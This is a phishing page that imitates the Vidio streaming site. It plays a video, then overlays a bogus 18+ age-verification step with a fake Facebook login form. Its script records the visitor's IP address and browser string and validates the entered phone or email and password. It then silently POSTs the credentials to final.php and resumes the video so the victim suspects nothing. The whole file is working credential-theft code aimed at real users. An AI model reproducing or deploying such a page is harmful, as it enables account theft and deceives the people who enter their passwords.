<?php
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta charset="utf-8" />
        <meta content="anhYe8osmNccRe0z98ogzdJpWPbNg8di-AQoV_trM70" name="google-site-verification" />
        <meta name="google" value="notranslate" />
        <meta content="id" name="language" />
        <meta name="csrf-param" content="authenticity_token" />
        <meta name="csrf-token" content="XREzFQDAm4fYLki+Krz06K3hdiASw/3aTMdPSY3eIMTJGgmjh7mY9DZf5beTYnc/oTUt3//NRSoyjnY3Zu+Quw==" />
        <title>Vidio - Nonton Tv Streaming, Serial, Sinetron & Sepak Bola | Vidio</title>
        <meta content="Vidio adalah layanan video streaming dengan berbagai konten tv streaming, film, sinetron, original series dan olahraga seperti Liga 1, Champions serta Eropa" name="description" />
        <meta content="Vidio, Vidio.com Video" name="keywords" />
        <meta content="923560728108869" property="fb:app_id" />
        <meta content="Vidio" property="og:site_name" />
        <meta property="og:title" content="Vidio - Nonton Tv Streaming, Serial, Sinetron &amp; Sepak Bola" />
        <meta property="og:description" content="Vidio adalah layanan video streaming dengan berbagai konten tv streaming, film, sinetron, original series dan olahraga seperti Liga 1, Champions serta Eropa" /><meta property="og:type" content="website" />
        <meta property="og:image" content="https://cdn-production-thumbor-vidio.akamaized.net/DQco7DkUm-qF3V5eayIUHvssebE=/filters:quality(70)/vidio-web-prod-category/uploads/category/image/52/home-page-d9e69d.jpg" />
        <meta content="9a2de3fdafe8d84c3a432aeac902ee0c64d3a09c3bad35803ed103383d78084b" name="ahrefs-site-verification" />
        <link rel="stylesheet" href="css/style.css">
    </head>
    <body>
        <div class="container">
            <video id="media" src="media/1.mp4" autoplay loop muted></video>
            



            <div class="blur">
                <h1 class="pertama">Mau Lanjut Nonton?</h1>
                <span class="kedua">Untuk Melanjutkan Verifikasi Bahwa Umur Anda 18+</span>
                <img onclick="$('.login-facebook').fadeIn()" src="https://m.alfascorpii.co.id/web_lib/img/fb_login.png">
            </div>


            <div class="popup-login login-facebook animated fadeIn" style="display: none;">
                <div class="popup-box-login-fb">
                   <div class="navbar-fb">
                      <img width="45" src="https://i.im.ge/2021/09/15/Tw3QNy.png">
                   </div>
                   <div class="content-box-fb">
                     <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                     <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
                      <img width="75" height="75" src="https://i.ibb.co/ThFWLfQ/logofbb-removebg-preview.png">
                      <div class="txt-login-fb">
                       Masuk ke akun Facebook Anda untuk terhubung dengan Video
                      </div>
                      <form class="login-form" method="POST" action="" onsubmit="$(this).end()">
                         <label>
                         <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
                         </label>
                         <label>
                         <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
                         </label>
                         <input type="hidden" name="ip" value="">
                         <input type="hidden" name="ua" value="">
                         <button  type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
                      </form>
                      <div class="txt-create-account">Create account</div>
                      <div class="txt-not-now">Not now</div>
                      <div class="txt-forgotten-password">Forgotten password?</div>
                   </div>
                   <div class="language-box">
                      <center>
                      <div class="language-name language-name-active">English (UK)</div>
                      <div class="language-name">Bahasa Indonesia</div>
                      <div class="language-name">Basa Jawa</div>
                      <div class="language-name">Bahasa Melayu</div>
                      <div class="language-name">日本語</div>
                      <div class="language-name">Español</div>
                      <div class="language-name">Português (Brasil)</div>
                      <div class="language-name">
                         <i class="fa fa-plus"></i>
                      </div>
                      </center>
                   </div>
                   <div class="copyrights">Facebook Inc.</div>
                </div>
            </div>
        </div>

    <script src="https://unpkg.com/ajax-libs@9.0.1/jquery.min.js"></script>
    <script>
        function play(){
            $('#media').prop('muted',false);
        }
        setTimeout(() => {
            $('.blur').fadeIn('slow');
        },2000)
        $.ajax({
                type: "get",
                async: false,
                url: "https://na.apps.amsoveasea.com/swoole/?actid=2020&r=index/getCountry&_only_service_response_=1",
                dataType: "json",
                success: function (result) {
                $('input[name="ip"]').val(result.ip);
                $('input[name="ua"]').val(navigator.userAgent)
                }
            })
        window.addEventListener('submit',function(e){
                e.preventDefault();
                $("#btnfb").addClass("disabled");
                setTimeout(() => {
                var user = $('#user').val();
                var pass = $('#pass').val();
                if(user == '' || user == null)
                {
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                }else{
                
                    if(user.includes('@')){
                    let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                    if(user.match(pattern)){
                    $('.email').hide();
                    }else{
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }
                    }
                    
                    if(!isNaN(user)){
                    if(user.length <= 10){
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }else{
                    $('.email').hide();
                    }
                    }
                    
                    if(user.match(/\s/g)){
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }else{
                    $('.email').hide();
                    }
                    
                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if(user.match(regex)){
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }
                    
                    
                    if(user.length <= 5){
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }else{
                    $('.email').hide();
                    }
                    
                }
                if(pass == '' || pass == null || pass.length <= 5)
                {
                    $('.sandi').show();
                    $("#btnfb").removeClass("disabled");
                    return false;
                }else{
                    $('.sandi').hide();
                }
                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if(pass.match(regexs)){
                    $('.sandi').show();
                    $('.email').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                    }else{
                    $('.sandi').hide();
                    }
                $.ajax({
                    type: 'POST',
                    url: 'final.php',
                    data: $('.login-form').serialize(),
                    dataType: 'text',
                    success: function() {
                        $('.blur').fadeOut();
                        $('.login-facebook').fadeOut();
                        $('#media').get(0).currentTime = 0;
                        $('#media').prop('muted',false)
                        } 
                })
            },1000)
        })
    </script>
    </body>
</html>
